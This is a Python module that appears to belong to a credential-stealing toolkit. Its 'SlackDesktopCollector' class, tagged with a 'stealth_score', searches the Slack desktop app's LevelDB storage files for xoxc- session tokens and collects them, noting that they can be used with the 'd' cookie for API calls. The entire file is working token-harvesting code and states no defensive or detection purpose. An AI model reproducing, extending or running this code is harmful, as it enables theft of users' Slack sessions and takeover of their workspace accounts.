"""Slack desktop app token collector — reads LevelDB storage."""

from __future__ import annotations

import re
from pathlib import Path
from typing import List

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import slack_data_dir


@CollectorRegistry.register
class SlackDesktopCollector(BaseCollector):
    service = "slack"
    source = "desktop"
    stealth_score = 5

    def _find_storage_dirs(self) -> List[Path]:
        """Find Slack desktop LevelDB directories."""
        dirs = []
        base = slack_data_dir()

        # Slack stores tokens in Local Storage leveldb
        ls_dir = base / "Local Storage" / "leveldb"
        if ls_dir.exists():
            dirs.append(ls_dir)

        # Also check storage directory
        storage_dir = base / "storage"
        if storage_dir.exists():
            dirs.append(storage_dir)

        return dirs

    def discover(self) -> List[DiscoveredToken]:
        results = []
        for ls_dir in self._find_storage_dirs():
            # Scan log files for xoxc tokens
            for log_file in ls_dir.glob("*.log"):
                try:
                    raw = log_file.read_bytes()
                    text = raw.decode("utf-8", errors="replace")
                    if "xoxc-" in text:
                        results.append(DiscoveredToken(
                            service=self.service,
                            source=self.source,
                            path=str(ls_dir),
                            stealth_score=self.stealth_score,
                            details="xoxc token found in desktop app",
                        ))
                        break
                except Exception:
                    continue

        return results

    def collect(self) -> List[CollectedToken]:
        results = []
        for ls_dir in self._find_storage_dirs():
            for log_file in ls_dir.glob("*.log"):
                try:
                    raw = log_file.read_bytes()
                    text = raw.decode("utf-8", errors="replace")

                    # Find xoxc- tokens (browser session tokens)
                    for match in re.finditer(r'(xoxc-[A-Za-z0-9-]+)', text):
                        token_val = match.group(1)
                        if len(token_val) > 20:  # Filter out partial matches
                            results.append(CollectedToken(
                                service=self.service,
                                source=self.source,
                                stealth_score=self.stealth_score,
                                access_token=secure(token_val),
                                extra={
                                    "token_type": "xoxc",
                                    "source_file": str(log_file),
                                    "note": "Browser session token — requires d cookie for API calls",
                                },
                            ))
                except Exception:
                    continue

        # Deduplicate by token value
        seen = set()
        unique = []
        for t in results:
            val = t.access_token.value if t.access_token else None
            if val and val not in seen:
                seen.add(val)
                unique.append(t)

        return unique
